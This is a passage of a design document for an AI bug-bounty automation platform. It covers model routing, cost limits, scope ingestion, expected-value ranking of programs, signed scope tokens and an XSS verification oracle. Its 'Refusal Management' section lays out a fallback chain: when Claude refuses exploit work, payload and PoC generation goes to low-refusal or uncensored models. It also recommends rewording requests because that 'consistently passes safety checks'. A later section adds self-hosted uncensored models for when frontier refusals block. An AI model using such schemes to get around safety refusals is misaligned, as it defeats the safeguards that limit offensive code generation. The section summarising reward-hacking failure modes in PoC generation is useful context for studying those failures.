**Provider ordering:** The `provider.order` field specifies a ranked list of preferred providers for the same model. For Sonnet 4.6, the preferred order is `["Anthropic", "Amazon Bedrock", "Google Vertex"]` — Anthropic direct for lowest latency when BYOK quota remains, Bedrock and Vertex as fallbacks.

**Performance tiers:** Append `:nitro` to a model slug (e.g., `anthropic/claude-sonnet-4-6:nitro`) to request the highest-throughput, lowest-latency provider instance, typically at 1.5–2× the base price. Use `:nitro` only for the validation oracle calls where latency directly affects the scan's wall-clock time. Append `:floor` for lowest-cost routing. Append `:free` for models with free tiers (Qwen3-Coder, Venice Dolphin).

**Fallback arrays:** When a model is unavailable or returns an error, OpenRouter's `allow_fallbacks: true` flag enables automatic fallback. For BountyStrike's routing, we configure explicit fallback arrays per task:

```json
{
  "model": "anthropic/claude-sonnet-4-6",
  "provider": {
    "order": ["Anthropic", "Amazon Bedrock"],
    "allow_fallbacks": true
  },
  "fallback_models": [
    "openai/gpt-5.4",
    "google/gemini-3.1-pro",
    "deepseek/deepseek-v4-flash"
  ]
}
```

**`require_parameters` enforcement:** For JSON schema extraction tasks (bulk triage, finding normalization), set `provider.require_parameters: true`. This ensures OpenRouter only routes to providers that support the `response_format: {type: "json_schema"}` parameter — preventing silent schema violations from providers that ignore unsupported parameters.

**Transforms:** The `transforms: ["middle-out"]` option applies OpenRouter's context compression for models approaching their context limit. Use only for recon synthesis tasks with massive outputs; disable for validation and report writing where output fidelity is non-negotiable.

## 3.4 Cost Guardrails

The cost guardrails operate at three levels:

**Level 1 — Per-task model ceiling:** Each task type has a maximum cost ceiling enforced by the OpenRouter Bridge MCP. If the expected cost for a task call exceeds the ceiling, the MCP downgrades to the next cheaper model in the routing matrix. Example: if a hypothesis generation call would cost >$0.50 on Opus 4.7 (due to large context), the MCP downgrades to Sonnet 4.6 and logs a cost-downgrade event to Langfuse.

**Level 2 — Per-scan budget:** The coordinator receives a `cost_budget_usd` field in its ScanJobRequest. It tracks cumulative LLM costs via `mcp__openrouter__generation_stats` and initiates an early-stop protocol if cumulative costs exceed 80% of budget with no validated findings yet. Early-stop surfaces a pause event to the operator: "Scan at 80% cost budget, no validated findings. Options: extend budget / switch to cheaper models / stop."

**Level 3 — Monthly ceiling per deployment:** The solo deployment enforces a monthly LLM cost ceiling in the Hatchet workflow engine. If the month's total OpenRouter spend exceeds the operator's configured ceiling (default $30/month), all new scan jobs are paused until the next month or until the operator manually increases the ceiling.

**Solo cost model worked example (per 100-target engagement):**
- Recon (Haiku 4.5, 200K tokens): 100 targets × 2K tokens avg = 200K tokens × $0.001/K = $0.20
- Scanner triage (DeepSeek V4-Flash, bulk JSON extraction, 500K tokens): $0.14/Mtok × 0.5M = $0.07 (per api-docs.deepseek.com; see docs/bountystrike_v6_phase0-1_technical_brief.md — corrects the v6 figure)
- Exploit generation (Venice Dolphin FREE + Qwen3-Coder FREE): $0.00
- Validation oracle (Sonnet 4.6, 50K tokens for 5 candidates): $0.003/K × 50K = $0.15
- Report generation (Sonnet 4.6, 3 validated findings, 10K tokens each): $0.003/K × 30K = $0.09
- **Total per 100-target engagement: ~$0.51 = $0.0051/target** — well under the $0.20/target solo target

**SaaS cost tiers:**
- Starter ($5/month): 25 scans/month × $0.20/scan, DeepSeek V4-Flash primary
- Professional ($50/month): 250 scans/month × $0.20/scan, Sonnet 4.6 primary with Opus fallback
- Enterprise ($200/month): Unlimited scans, Opus 4.7 primary, Mythos access for Glasswing partners

## 3.5 Provider Routing for Anthropic BYOK

The BYOK (Bring Your Own Key) program on OpenRouter allows operators to use their own Anthropic API keys for Anthropic model calls. As of April 2026, Anthropic provides 1 million free requests per month under the BYOK program [research/openrouter_models.md §BYOK].

BountyStrike v5's BYOK integration:

```json
// OpenRouter request with BYOK
{
  "model": "anthropic/claude-sonnet-4-6",
  "messages": [...],
  "provider": {
    "order": ["Anthropic"],
    "anthropic_beta": "output-300k-2026-03-24"
  },
  "headers": {
    "X-OpenRouter-Provider-Key": "sk-ant-...{operator_byok_key}"
  }
}
```

The `output-300k-2026-03-24` beta header enables up to 300K output tokens for Opus 4.7, Opus 4.6, and Sonnet 4.6 — critical for report generation on complex multi-step vulnerability chains that require extensive reproduction steps.

The BYOK key is stored in the operator's secrets manager (1Password CLI for solo; Infisical for SaaS) and injected at session start by the `SessionStart` hook. It is never written to the agent's conversation history or logged in plaintext.

## 3.6 Refusal Management

A runtime refusal classifier routes known-refusal payload categories to Venice Dolphin / Hermes-4-70B. Venice Dolphin (free tier) has a 2.2% refusal rate; Hermes-4-70B maintains similar low-refusal behavior [research/openrouter_models.md §Tier-U]. (no primary source for a hard Anthropic refusal %; described as mechanism per v6 reframe)

The platform's refusal management strategy is not to attempt to bypass Anthropic's safety systems — that is both futile and against terms of service — but to route tasks appropriately so that safety-constrained models never see requests they would refuse. The routing policy is:

1. **Legitimate methodology requests** (how does SSRF work? what is the impact of this SQLi?) → Anthropic models. These are educational and analysis tasks where Anthropic's responses are excellent.

2. **Generic exploitation technique requests** (generate an SSRF payload for this URL) → The model selection depends on context. In an active, scope-confirmed engagement with a T2-approved exploitation task, this routes to Venice Dolphin or Hermes-4-70B via OpenRouter. The provider key carries `provider.data_collection: "deny"` to ensure Venice's privacy-preserving routing.

3. **Chain-of-thought reasoning about attack paths** → Anthropic Sonnet 4.6 or Opus 4.7. The framing is "given these scanner outputs, what are the most likely exploitable conditions?" rather than "generate an exploit." This framing consistently passes safety checks and produces high-quality attack reasoning.

4. **PoC code generation** → Qwen3-Coder (free) or Devstral. Both have minimal refusal rates for security-relevant code and are specifically optimized for code generation tasks.

**Fallback chain for exploit-agent:**
```
Anthropic Sonnet 4.6 (attempt once with authorized-engagement framing)
  → Claude refused → Venice Dolphin FREE via OpenRouter
    → Venice refused or quality poor → Hermes-4-70B ($0.13/$0.40)
      → Hermes refused → Devstral ($0.10/$0.30) with code-specific framing
        → All failed → log refusal chain to Langfuse; surface to operator
```

## 3.7 Self-Hosted Tier-S-Cyber Models

Five security-tuned models are available for self-hosted deployment on GPU infrastructure, providing uncensored offensive capability without external API dependencies [research/openrouter_models.md §Tier-S-Cyber]:

**Deep Hat V2 (30B):** Reportedly outperforms GPT-4-class models on CTF and threat intelligence scenarios. Available via Kindo's API at approximately $0.40/$1.20 per Mtok. Recommended for complex multi-step CTF-style vulnerability chains where frontier model refusals are blocking.

**WhiteRabbitNeo V3 (8B):** Available on HuggingFace for local deployment. The 8B parameter count means it runs on a consumer GPU (RTX 3090 or better). Primary use case: offline exploit development on air-gapped engagement environments. Quality ceiling is lower than the 30B Deep Hat but acceptable for payload generation tasks.

**Foundation-Sec-8B (Cisco):** Continued pre-training on a cybersecurity corpus. Available at `fdtn-ai/Foundation-Sec-8B` on HuggingFace. Best for threat intelligence synthesis and CVE description understanding. Deployable on 1× A100 or equivalent.

**Pentest-R1:** RL-trained on 500+ HTB/VulnHub walkthroughs using GRPO online reinforcement learning. Achieves 24.2% on AutoPenBench (comparable to Gemini 2.5 Flash at benchmark). Best for structured penetration testing task completion. Available via Ollama for local deployment.

**Red-MIRROR (LoRA on Qwen2.5-14B):** Trained on 1,644 CVE/CAPEC/MITRE technique pairs. Achieves 86% on the XBOW benchmark. The highest-performing publicly available self-hosted model for web application vulnerability discovery. Requires 4× A100 or 2× H100 for serving at acceptable latency.

**Self-hosting infrastructure:** The solo deployment can run WhiteRabbitNeo V3 and Foundation-Sec-8B on a single RTX 4090 (24GB VRAM) using Ollama. The SaaS deployment serves Pentest-R1 and Red-MIRROR on a dedicated Hetzner AX102 (2× A100, 80GB each) running vLLM with PagedAttention. Cost at SaaS scale: ~€3.10/hour × 730 hours/month = ~$2,400/month for GPU infrastructure, amortized across the customer base.

## 3.8 Circuit Breakers and Fallback Architecture

```
┌─────────────────────────────────────────────────────────────┐
│  OpenRouter Bridge MCP — Circuit Breaker Logic               │
│                                                              │
│  For each model call:                                        │
│  1. Check circuit state (closed/open/half-open) from Redis  │
│  2. If circuit OPEN for model X → skip to fallback          │
│  3. Attempt call with 10s timeout                           │
│  4. On success → reset failure counter                      │
│  5. On failure/timeout:                                     │
│     - Increment failure counter (per model per 60s window)  │
│     - If failures >= 3 in window: OPEN circuit for 120s     │
│     - Route to fallback model from routing matrix           │
│  6. On 429 (rate limit): exponential backoff (1s, 2s, 4s)  │
│  7. On 5xx from OpenRouter: retry on alternate provider     │
│                                                              │
│  Special cases:                                              │
│  - If ALL Anthropic models circuit-open: use BYOK direct    │
│  - If ALL models for task circuit-open: pause job, alert    │
│  - If cost ceiling hit: downgrade tier, do not pause        │
└─────────────────────────────────────────────────────────────┘
```

---

# Part 4 — Scope Ingestion + EV Engine

## 4.1 Federation Strategy

The scope ingestion layer aggregates data from five primary sources at different cadences, creating a continuously-updated, multi-layered picture of every bug bounty program's attack surface [research/program_selection.md §1]:

**Layer 0 — arkadiyt/bounty-targets-data (30-minute cadence, unauthenticated):** The public baseline. A GitHub repository that provides normalized JSON files for HackerOne, Bugcrowd, Intigriti, YesWeHack, and Immunefi programs. Updated via a GitHub Actions cron job every 30 minutes. The ingest worker pulls the raw JSON via `https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/{platform}_data.json`. This is the zero-auth, zero-setup baseline that works out of the box.

**Layer 1 — sw33tLie/bbscope v2 (6-12 hour cadence, authenticated):** Authenticated scope retrieval via the bbscope CLI. Provides richer data than arkadiyt: authenticated HackerOne private program access, Bugcrowd session-authenticated scopes, Intigriti PAT-authenticated scopes including the per-endpoint `maxBounty`/`minBounty`/`tier` fields that arkadiyt strips, and YesWeHack Bearer-authenticated scopes with `asset_value` field. Requires stored credentials (session cookies or TOTP seeds) per platform.

**Layer 2 — rix4uni/scope (10-minute cadence, unauthenticated):** The fastest-updating public scope source. The rix4uni/scope repository publishes `newdata_inscope_wildcards.txt` files updated every 10 minutes. This is the source for "what changed in the last 10 minutes" — critical for the freshness score calculation and for new-scope-change notifications.

**Layer 3 — projectdiscovery/public-bugbounty-programs (daily, unauthenticated):** The ProjectDiscovery public bug bounty programs list covers VDPs (Vulnerability Disclosure Programs), HackenProof, Code4rena, and long-tail programs not in arkadiyt's five-platform scope. Weekly PR cadence. Lower freshness but broader coverage for the program universe.

**Layer 4 — Trickest/800 programs (daily, authenticated):** Trickest's catalog of 800+ public bounty programs with technology stack fingerprints from server response headers. The `server-report.csv` file maps program domains to technology stacks — enabling the KEV/EPSS CVE opportunity score by cross-referencing CVEs against the programs that run the affected technology.

## 4.2 HackerOne April 2026 Deprecation Migration

On April 16, 2026, HackerOne deprecated the `structured_scopes` endpoint in favor of an organization-level assets management system [research/program_selection.md §2 H1 API Changes]. This is a breaking change that affects every tool in the scope ingestion ecosystem.

**Old endpoint (deprecated):**
```
GET /api/v1/programs/{handle}/structured_scopes
Authorization: Bearer {token}
```

**New org assets endpoint:**
```
GET /api/v1/organizations/{org_id}/assets
Authorization: Bearer {token}
```

Response schema migration:

```json
// OLD (structured_scopes)
{
  "data": [
    {
      "type": "structured_scopes",
      "attributes": {
        "asset_type": "URL",
        "asset_identifier": "*.example.com",
        "eligible_for_bounty": true,
        "max_severity": "critical",
        "created_at": "2024-01-15T12:00:00Z",
        "updated_at": "2025-11-20T08:30:00Z"
      }
    }
  ]
}

// NEW (org assets)
{
  "data": [
    {
      "type": "asset",
      "id": "asset_a7f3...",
      "attributes": {
        "asset_type": "url",
        "identifier": "*.example.com",
        "in_scope": true,
        "bounty_eligible": true,
        "severity_ceiling": "critical",
        "program_handles": ["acme-corp", "acme-internal"],
        "created_at": "2024-01-15T12:00:00Z",
        "last_modified_at": "2025-11-20T08:30:00Z",
        "tags": ["external", "production"],
        "notes": "Excludes staging.*.example.com"
      }
    }
  ]
}
```

The key differences that affect BountyStrike v5's ingestion logic:
1. The new `identifier` field replaces `asset_identifier` — trivial rename
2. `last_modified_at` replaces `updated_at` — also trivial
3. Assets now carry a `program_handles` array — one asset can belong to multiple programs
4. The `tags` and `notes` fields are new and contain exclusion hints that must be parsed for scope refinement
5. The `filter[updated_at__gt]` query parameter (added January 15, 2026) enables change-event-driven ingestion — pull only assets changed since the last sync timestamp

**Migration code patch (scope-mcp/src/h1_client.ts):**
```typescript
async function fetchProgramAssets(orgId: string, since?: Date): Promise<Asset[]> {
  const params = new URLSearchParams({
    'page[size]': '100',
    'page[number]': '1',
  });
  if (since) {
    params.set('filter[updated_at__gt]', since.toISOString());
  }
  
  const response = await h1Client.get(
    `/api/v1/organizations/${orgId}/assets?${params}`
  );
  
  return response.data.data.map(normalizeOrgAsset);
}

function normalizeOrgAsset(raw: H1OrgAsset): NormalizedScope {
  return {
    platform: 'hackerone',
    program_handles: raw.attributes.program_handles,
    identifier: raw.attributes.identifier,
    asset_type: raw.attributes.asset_type,
    in_scope: raw.attributes.in_scope,
    bounty_eligible: raw.attributes.bounty_eligible,
    severity_ceiling: raw.attributes.severity_ceiling,
    last_modified: new Date(raw.attributes.last_modified_at),
    exclusion_notes: raw.attributes.notes,
    tags: raw.attributes.tags,
    source: 'h1_org_assets',
    source_id: raw.id,
  };
}
```

## 4.3 Per-Platform Scope APIs

### 4.3.1 Bugcrowd

Bugcrowd's scope model uses `target_groups` with `in_scope: true/false`, `category` (website/api/mobile/other), and `reward_range` per target. The `point` field (0-10 internal priority) provides an additional signal independent of external payout documentation.

```bash
# Direct Bugcrowd API (authenticated)
curl -s "https://bugcrowd.com/{program-slug}.json" \
  -b "_bugcrowd_session={cookie}" \
  | jq '.target_groups[] | select(.in_scope==true) | .targets[] | {name, category, reward_range}'
```

Bugcrowd maps severity via P1-P4 (P1=Critical, P2=High, P3=Medium, P4=Low) rather than CVSS. The EV ranker normalizes this to a `payout_by_severity` dict during ingestion.

### 4.3.2 Intigriti

Intigriti's per-endpoint `maxBounty`/`minBounty`/`tier` fields provide richer EV data than any other platform. The `tier` field (`starter|pro|professional|elite`) is a direct saturation proxy: elite-tier programs have fewer active researchers and typically higher acceptance rates.

```bash
curl -s "https://api.intigriti.com/core/researcher/v1/programs/{company}/{program}/scopes" \
  -H "Authorization: Bearer ${INTIGRITI_PAT}" \
  | jq '.inScope[] | {endpoint, tier, maxBounty, minBounty, type}'
```

Intigriti's `--oos` flag in bbscope is unique — it exposes the out-of-scope list which competitors' CLI tools do not expose. The scope-mcp ingests OOS entries as `in_scope: false` records with `exclusion_reason: "platform_oos"` to enable hard-exclusion filtering.

### 4.3.3 YesWeHack

YesWeHack's `asset_value` (low/medium/high) maps directly to the EV ranker's asset-type weight multiplier. `high` asset_value multiplies the asset's contribution to the program EV by 1.3×; `low` by 0.7×.

```bash
curl -s "https://api.yeswehack.com/programs/${SLUG}" \
  -H "Authorization: Bearer ${YWH_TOKEN}" \
  | jq '.scopes[] | {scope, scope_type, in_scope, asset_value}'
```

YesWeHack programs skew toward European organizations with lower researcher density than equivalent H1 programs — this is a structural first-mover advantage that the saturation sub-score captures via the `researcher_count` field.

### 4.3.4 Immunefi

Immunefi requires no authentication. The `impacts` array provides payout-per-impact-type rather than payout-per-severity, requiring a custom normalization path:

```bash
curl -s "https://immunefi.com/bounty/{project}/json" \
  | jq '.impacts[] | {type, severity, description, payout}'
```

The EV ranker maps Immunefi critical smart contract impacts directly to `max_payout_critical`. For smart contracts, the EV weight multiplier is 1.40 — the highest of any asset type — because Immunefi critical payouts can reach $15.5M (Uniswap) [research/program_selection.md §10.3].

## 4.4 The EV Scoring Formula

The Expected Value formula quantifies the hourly return from hunting a specific bug class on a specific program. The full formula [research/program_selection.md §10.1]:

\[ EV_b = \text{BountyRange}_b \times P(\text{eligible}_b) \times P(\text{find}_b \mid \text{skill}) \times P(\text{exploitable}_b) \times \frac{1}{T_{\text{validate}}} \]

Where:
- \(\text{BountyRange}_b = \frac{\text{min\_payout}_b + \text{max\_payout}_b}{2} \times \text{bounty\_paid\_ratio}\)
- \(P(\text{eligible}_b) = \text{triage\_acceptance\_rate} \times (1 - \text{dup\_rate}) \times \text{bounty\_paid\_ratio}\)
- \(P(\text{find}_b \mid \text{skill})\) = operator's empirical find rate for bug class b (Bayesian prior updated from submission history)
- \(P(\text{exploitable}_b)\) = EPSS score (if CVE-mapped) else CVSS exploitability sub-score normalized to [0,1]
- \(T_{\text{validate}}\) = expected hours to produce a PoC (base estimate / operator skill multiplier)

The total program EV aggregates across all bug classes:

\[ EV_{\text{program}} = \frac{\sum_{b \in \text{classes}} EV_b \cdot A_b}{\hat{T}_{\text{total}}} \]

Where \(A_b\) is the asset-type weight for bug class b.

The normalized implementation as a dimensionless score ∈ [0,1]:

\[ S = w_1 \cdot f_{\text{payout}} + w_2 \cdot f_{\text{sat}} + w_3 \cdot f_{\text{ops}} + w_4 \cdot f_{\text{fit}} \]

\[ EV_{\text{score}} = \min\!\left(S \cdot (1 + 0.20 \cdot f_{\text{cve}}),\; 1.0\right) \]

**Default weights (v2.0):**

| Component | Weight | Rationale |
|---|---|---|
| Payout (f_payout) | 0.35 | Primary economic signal |
| Saturation (f_sat) | 0.25 | Determines collectability |
| Ops quality (f_ops) | 0.25 | Determines timing and reliability of payment |
| Asset fit (f_fit) | 0.15 | Operator skill leverage multiplier |
| CVE bonus (+20%) | multiplicative | First-mover advantage on open CVEs |

## 4.5 Asset-Type Weighting Table

| Asset Type | H1 Field | EV Weight | Rationale |
|---|---|---|---|
| `web-application` (URL/wildcard) | `url` | 1.00 | Baseline; broadest skill applicability |
| `api` (REST/GraphQL) | `url` subtype | 1.15 | Auth flaws +36% YoY; lower automated coverage |
| `cloud_config` (AWS/Azure/GCP) | `cloudConfig` | 1.30 | Privilege escalation chains; $50K–$151K payouts; low density |
| `ai_model` (LLM endpoints) | `aiModel` | 1.25 | Prompt injection +540% YoY; programs under-staffed |
| `smart_contract` (Immunefi) | `smart_contract` | 1.40 | Critical = millions; highest payout ceiling |
| `mobile` Android | `android` | 0.85 | More setup overhead; narrower exploit paths |
| `mobile` iOS | `ios` | 0.80 | Sandboxing limits impact; higher reproduce burden |
| `cidr` (IP range) | `cidr` | 0.90 | Network infra bugs; requires nmap/naabu tooling |
| `executable` / binary | `other` | 0.70 | Requires reverse engineering; long time-to-validate |
| VDP (no bounty) | `bounty: false` | 0.10 | No cash; skill building only |

## 4.6 Freshness Decay and Staleness

Scope freshness is modeled with an exponential decay function [research/program_selection.md §11.1]:

\[ f_{\text{fresh}}(\Delta t) = e^{-\lambda \cdot \Delta t} \]

With \(\lambda = 0.00065\) (hours⁻¹) (hand-tuned heuristic constant, pending empirical calibration — no published derivation), giving:
- `scope_freshness(0)` = 1.00 (just changed)
- `scope_freshness(48)` = 0.97 (2 days)
- `scope_freshness(168)` = 0.89 (1 week)
- `scope_freshness(720)` = 0.63 (1 month)
- `scope_freshness(4320)` = 0.06 (6 months)

KEV/EPSS opportunity also decays with a steeper function (μ = 0.00963/hour) (hand-tuned heuristic constant, pending empirical calibration — no published derivation), so the first-mover advantage of a new KEV entry halves in ~72 hours [research/program_selection.md §11.2]:

\[ f_{\text{kev}}(\Delta t_{\text{kev}}) = e^{-\mu \cdot \Delta t_{\text{kev}}} \]

The combined CVE opportunity score:

```python
def cve_opportunity_score(epss: float, kev_age_hours: float,
                           has_nuclei_template: bool,
                           cvss_exploitability: float = 0.5) -> float:
    LAMBDA = 0.00065  # hand-tuned heuristic, pending empirical calibration
    MU = 0.00963      # hand-tuned heuristic, pending empirical calibration
    
    template_factor = 0.25 if has_nuclei_template else 1.00
    freshness = math.exp(-MU * kev_age_hours)
    exploit_prob = max(epss, cvss_exploitability * 0.3)
    
    return min(exploit_prob * freshness * template_factor, 1.0)
```

## 4.7 KEV/EPSS Integration

The platform consumes three real-time vulnerability intelligence sources:

**CISA KEV (JSON feed):**
```bash
curl -s "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json" \
  | jq '.vulnerabilities[] | {cveID, vendorProject, product, dateAdded, shortDescription}'
```

**EPSS v4 API (First.org):**
```bash
curl -s "https://api.first.org/data/v1/epss?cve=CVE-2024-XXXX" \
  | jq '.data[] | {cve, epss, percentile}'
# EPSS = probability of exploitation in next 30 days, 0.0–1.0
```

**VulnCheck KEV (extended, with 400+ additional entries beyond CISA):**
```bash
curl -s "https://api.vulncheck.com/v3/index/vulncheck-kev" \
  -H "Authorization: Bearer ${VULNCHECK_API_KEY}" \
  | jq '.data[] | {cve_id, date_added, kev_added, epss}'
```

The `kev-mcp` server wraps all three APIs, normalizes the responses, and exposes two tools:
- `kev_get_recent(hours=72)`: Returns all KEV entries added in the last N hours, sorted by EPSS score descending
- `kev_match_program(program_handle)`: Cross-references program tech stack (from Trickest CSV) against all KEV entries; returns CVEs affecting the program's detected technologies, with `has_nuclei_template`, `kev_age_hours`, and `epss` fields

## 4.8 Scope-MCP Tool Signatures

The scope-mcp is the single interface that all Claude Code agents use for scope-related operations. It is implemented in TypeScript and serves via stdio MCP transport. Seven tools [research/program_selection.md §scope-mcp signatures]:

```typescript
// scope-mcp TypeScript tool definitions
interface ScopeMCP {
  // Validate a target against the active scope JWT
  check_target(args: {
    target: string;          // hostname, IP, URL, or CIDR
    scope_jwt: string;       // RS256-signed JWT
    tool_context?: string;   // what tool is about to use this target
  }): Promise<{
    in_scope: boolean;
    exclusion_reason?: string;
    requires_defer: boolean;   // true if human review needed
    audit_id: string;
  }>;

  // List all in-scope assets for a program
  list_in_scope_assets(args: {
    program_handle: string;
    platform: 'hackerone' | 'bugcrowd' | 'intigriti' | 'yeswehack' | 'immunefi';
    asset_types?: string[];
  }): Promise<NormalizedScope[]>;

  // Get program rules text (for scope-guard agent decisions)
  get_program_rules(args: {
    program_handle: string;
    platform: string;
  }): Promise<{ rules_text: string; last_updated: string }>;

  // Issue a new scope JWT for a job
  issue_scope_jwt(args: {
    program_handle: string;
    platform: string;
    operator_id: string;
    expiry_hours: number;  // max 168 (1 week)
  }): Promise<{ jwt: string; jti: string; issued_at: string }>;

  // Revoke a scope JWT (emergency kill)
  revoke_scope_jwt(args: {
    jti: string;
    reason: string;
  }): Promise<{ revoked: boolean }>;

  // Get scope change delta since timestamp
  get_scope_changes(args: {
    program_handle?: string;   // null = all programs
    since: string;             // ISO 8601 timestamp
    include_platforms?: string[];
  }): Promise<ScopeChange[]>;

  // Get EV-ranked program list
  rank_programs(args: {
    operator_profile: OperatorProfile;
    min_ev_score?: number;
    platforms?: string[];
    require_bounty?: boolean;
    limit?: number;
  }): Promise<RankedProgram[]>;
}
```

## 4.9 Signed RS256 Scope JWTs

The scope JWT is the platform's authorization token. It is issued by the control plane's scope JWT issuer, signed with RS256 (RSA-SHA256) using a 4096-bit key pair, and validated by every agent, every MCP server, and every sandbox VM that processes it.

**JWT payload schema:**
```json
{
  "jti": "jwt_2026042801_a7f3...",
  "iss": "bountystrike-v5-control-plane",
  "sub": "operator:alice",
  "iat": 1745800000,
  "exp": 1746403200,
  "program_handle": "acme-corp",
  "platform": "hackerone",
  "targets": {
    "wildcards": ["*.acme.com", "*.api.acme.com"],
    "exact_hosts": ["legacy.acme.com"],
    "ips": ["1.2.3.0/24"],
    "android_packages": ["com.acme.app"],
    "ios_bundles": []
  },
  "exclusions": {
    "hostnames": ["staging-internal.acme.com", "corp.acme.com"],
    "paths": ["/admin", "/internal"],
    "notes": "No DoS, no brute force, no social engineering"
  },
  "rate_limits": {
    "default_rps": 5,
    "relaxed_hosts": {"api.acme.com": 20}
  },
  "engagement_id": "eng_2026042801_a7f3..."
}
```

The JWT is validated at:
1. `SessionStart` hook (before any agent action begins)
2. Every call to `scope-mcp.check_target()` (inline validation per tool call)
3. Firecracker VM boot (network namespace setup reads JWT from environment)
4. Every submission to a platform API (report submission includes JWT's `jti` for audit correlation)

## 4.10 Change-Event Architecture

Rather than polling for scope changes, the architecture is change-event-first. When any ingestion worker detects a delta (new asset, removed asset, payout change), it publishes a typed event to the Hatchet/Temporal event bus:

```typescript
interface ScopeChangedEvent {
  event_type: 'scope_added' | 'scope_removed' | 'payout_changed' | 'program_paused';
  program_handle: string;
  platform: string;
  asset_identifier?: string;
  old_value?: any;
  new_value?: any;
  detected_at: string;
  source: 'arkadiyt' | 'rix4uni' | 'h1_org_assets' | 'bbscope';
}
```

Downstream workflows subscribe to `scope_added` events:
- **EV Reranker:** Recomputes EV score for the affected program
- **Scope JWT Refresh:** Issues new scope JWT incorporating the new asset
- **Operator Notification:** Sends notification to all operators subscribed to this program
- **Auto-Recon Trigger:** For operators with continuous coverage enabled, spawns a recon-agent against the new asset immediately

## 4.11 Worked Example — Ranking 50 Programs

Consider a solo operator with skills: SSRF (0.85), IDOR (0.75), GraphQL (0.70), cloud config (0.60). Time budget: 4 hours. Minimum payout for critical: $5,000.

**Step 1:** Pull 50 programs from ev_score_history ordered by ev_score DESC.

**Step 2:** Apply hard filters:
- `max_payout_critical < 5000` → removes 12 programs (all VDPs and low-budget programs)
- `safe_harbor_type IS NULL` → removes 3 programs (no safe harbor)
- `duplicate_rate > 0.4` → removes 5 programs (high saturation)
- `state != 'open'` → removes 2 programs (paused)
- **Remaining: 28 programs**

**Step 3:** Compute sub-scores for each remaining program, applying the asset-type weight from the operator's skill vector.

**Step 4:** Apply KEV/EPSS enrichment. Four programs have KEV entries on their stack with fresh EPSS > 0.5 added within 72 hours. Their EVscores receive the +20% CEV bonus × kev_freshness(24h) = 0.79, net +16%.

**Step 5:** Apply freshness decay. Three programs added new subdomains in the last 48 hours (freshness = 0.97). Their saturation sub-scores receive a 0.97× multiplier (minimal decay).

**Top 5 results:**
1. `blockchain-defi-protocol` — ev_score: 0.87 — Smart contract critical $2M, 3 KEV on Solidity libs, freshness 0.97
2. `major-saas-platform` — ev_score: 0.82 — API scope with GraphQL, critical $15K, researcher density 31 (low)
3. `cloud-infrastructure-co` — ev_score: 0.79 — Cloud config scope, critical $151K, new S3 assets added 36h ago
4. `enterprise-webapp-firm` — ev_score: 0.74 — Wide URL scope, critical $10K, KEV on log4j-adjacent library with EPSS 0.73
5. `mobile-fintech-app` — ev_score: 0.71 — API + Android scope, critical $25K, low researcher density (18)

The program-selector agent presents these 5 with explanation of the top contributing factors and recommended first-attack vectors for each.

---

# Part 5 — Deterministic Verifier (The Moat)

## 5.1 Why Deterministic Verification is the Differentiator

The AI-slop crisis documented in Section 1.2.1 has a single root cause that all the community commentary, all the competitive analysis, and all the academic benchmark papers converge on: AI systems generate hypotheses and then generate evidence for those hypotheses from the same generative process, creating a confirmation feedback loop. The generator hallucinates a vulnerability; the evaluator — being the same or similar model — hallucinate-confirms it. The resulting report is internally consistent but factually wrong [research/academic_cve.md §4.1 AnyPoC taxonomy].

The AnyPoC paper identifies four specific failure modes in reward-hacking PoC generation [research/academic_cve.md §4.1]:
1. **Self-exploitation:** Agent runs payload on its own execution environment, generates "evidence" of code execution that isn't on the target
2. **Mock validation:** Agent crafts a test that always returns the expected "vulnerable" response regardless of target state
3. **Hallucinated code paths:** Agent generates PoC for a code path that doesn't exist in the target version
4. **Timing coincidence:** Agent interprets network latency as a deliberate `SLEEP()` response

BountyStrike v5's deterministic verifier addresses all four failure modes by architectural construction:
- Self-exploitation is impossible because the sandbox VM's egress is scope-gated — any "code execution" on the attacker's own machine cannot generate an evidence artifact that reaches the validator
- Mock validation is impossible because the validator is a different model on a different invocation with no access to the generator's context
- Hallucinated code paths are caught by the oracle's deterministic execution — if the code path doesn't exist, the PoC simply doesn't produce the expected evidence artifact
- Timing coincidence is reduced by a Welch's t-test engineering heuristic (requires a population of measurements, not a single data point; calibrated against a labeled corpus with measured FP/FN rates — not an academically-derived SQLi-detection method) (engineering heuristic; no academic source for Welch-on-SQLi per v6)

The validator is the single most important component in the platform. Without it, BountyStrike v5 is another AI noise generator. With it, the platform produces findings that programs confirm.

## 5.2 Per-Bug-Class Oracle Design

### 5.2.1 XSS Oracle — Playwright DOM Mutation Observer

The XSS oracle spins a headless Chromium instance inside the sandbox VM, navigates to the target URL with the XSS payload embedded, and uses a DOM mutation observer to detect payload execution.

```python
# oracle_xss.py — Playwright-based XSS verification oracle
import asyncio
from playwright.async_api import async_playwright

async def verify_xss(target_url: str, payload: str, 
                      scope_token: str) -> OracleResult:
    """
    Verify XSS via:
    1. DOM mutation observer detecting payload string in DOM
    2. alert() dialog interception (classic alert(1))
    3. Sentinel cookie/localStorage write by payload
    4. Fetch to OAST callback from payload (for DOM-based stored XSS)
    """
    oast_token = generate_interactsh_token()
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            args=['--no-sandbox', '--disable-dev-shm-usage'],
        )
        page = await browser.new_page()
        
        # Intercept any dialog (alert, confirm, prompt)
        dialog_fired = asyncio.Event()
        dialog_message = None
        
        async def handle_dialog(dialog):
            nonlocal dialog_message
            dialog_message = dialog.message
            dialog_fired.set()
            await dialog.dismiss()
        
        page.on("dialog", handle_dialog)
        
        # Monitor DOM mutations
        mutation_observed = False
        
        await page.expose_function("__bsmutationObserver", 
                                    lambda: setattr(locals(), 
                                                    'mutation_observed', True))
        
        await page.add_init_script("""
            const observer = new MutationObserver((mutations) => {
                for (const mutation of mutations) {
                    if (mutation.type === 'childList' || 
                        mutation.type === 'characterData') {
                        window.__bsmutationObserver();
                    }
                }
            });
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                characterData: true
            });
        """)
        
        # Navigate to target with payload
        await page.goto(target_url, timeout=15000, 
                        wait_until='networkidle')
        
        # Wait for dialog or timeout
        try:
            await asyncio.wait_for(dialog_fired.wait(), timeout=5.0)
        except asyncio.TimeoutError:
            pass
        
        # Check for OAST callback (for stored/DOM XSS with fetch payload)
        oast_received = await check_oast_callback(oast_token, timeout=8)
        
        await browser.close()
        
        if dialog_fired.is_set():
            return OracleResult(
                verdict="validated",
                method="alert_dialog",
                dialog_message=dialog_message,
                evidence_hash=hash_evidence({
                    "url": target_url,
                    "payload": payload,
